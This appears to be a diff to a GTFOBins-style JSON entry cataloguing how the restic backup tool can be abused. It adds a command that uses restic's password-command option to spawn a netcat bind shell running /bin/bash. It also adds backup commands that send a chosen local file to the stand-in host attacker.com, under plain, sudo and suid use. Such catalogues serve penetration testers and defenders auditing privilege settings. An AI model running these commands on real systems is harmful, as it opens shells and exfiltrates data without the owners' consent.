@@ -1,19 +1,27 @@
 {
-  "description": "The attacker must setup a server to receive the backups, in the following example https://github.com/restic/rest-server/ is used but there are other options. To start a new instance and create a new repository:\n\n./rest-server --listen \":[port]\"\nrestic init -r \"rest:http://localhost:[port]/[file]\"\n\nTo extract the data from the restic repository in the current directory on the attacker side:\n\nrestic restore -r \"/tmp/restic/[file]\" latest --target .\n\nUpload data to the attacker server with the following commands.\n",
   "functions": {
+    "command": [
+      {
+        "description": "The attacker does not need to setup a server to receive the backups in this case. Command execution can be achieved through control of argv or environment, many restic subcommands support this option, so even if the attacker control only a subset of argv, command execution may still be achievable.",
+        "code": "RESTIC_PASSWORD_COMMAND='nc -l 127.0.0.1 -p 4321 -e /bin/bash' restic backup # Through environment\nrestic backup --password-command=\"nc -l 127.0.0.1 -p 4321 -e /bin/bash\"      # Through option\n"
+      }
+    ],
     "file-upload": [
       {
-        "code": "restic backup -r \"rest:http://[host]:[port]/[backup]\" \"[file]\"\n"
+        "description": "",
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo restic backup -r \"rest:http://[host]:[port]/[backup]\" \"[file]\"\n"
+        "description": "",
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
       }
     ],
     "suid": [
       {
-        "code": "./restic backup -r \"rest:http://[host]:[port]/[backup]\" \"[file]\"\n"
+        "description": "",
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
       }
     ]
   }
